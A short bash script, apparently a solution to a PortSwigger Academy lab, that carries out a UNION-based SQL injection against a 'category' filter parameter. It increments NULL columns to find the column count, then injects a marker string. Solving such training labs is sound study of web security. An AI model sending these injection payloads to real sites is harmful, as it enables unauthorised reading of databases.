#!/bin/bash

source ../common.hook

PAYLOAD=$(url_encode "/filter?category=Pets' UNION SELECT NULL-- ")

for i in {1..10}; do
    output "Trying ${PAYLOAD}" INFO
    curl "${PS_URL}${PAYLOAD}" | grep "Internal Server Error" 1>/dev/null
    if [ $(echo $?) -ne 0 ]; then
        output "Number of columns: ${i}" INFO; NUM_COLS=$i; break;
    fi

    PAYLOAD=$(url_encode "${PAYLOAD%--+},NULL-- ")
done

PAYLOAD=$(url_encode "/filter?category=Pets' UNION SELECT NULL,'YSQMi1',NULL--")
output "Trying ${PAYLOAD}" INFO
curl "${PS_URL}${PAYLOAD}"

eval_result $PS_URL
